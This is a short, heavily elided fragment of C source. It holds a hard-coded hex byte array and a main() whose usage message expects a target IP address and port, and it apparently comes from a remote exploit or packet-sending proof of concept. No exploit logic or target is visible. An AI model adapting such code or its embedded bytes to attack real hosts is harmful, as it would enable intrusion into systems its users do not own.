...
"\x49\x44\x41\x00\x01\x00\x00\x00\x18\xD5\x9E\xFE\xEB\x9D\xB0\x00"
"\x47\xB5\xA7\xFF\xCC\x2C\x2C\x00\xE2\x7B\xC6\xC9\x94\x16\x20\x3D"
"\x48\xE5\xC2\x69\x11\xD9\xC1\x97"
;
...
int main(int argc, char *argv[]) 
{
        ...
        if (argc < 3) 
	{
		...
		fprintf(stderr, "Example: %s 10.10.10.10 23945\n", argv[0]);
                exit(1);
        }
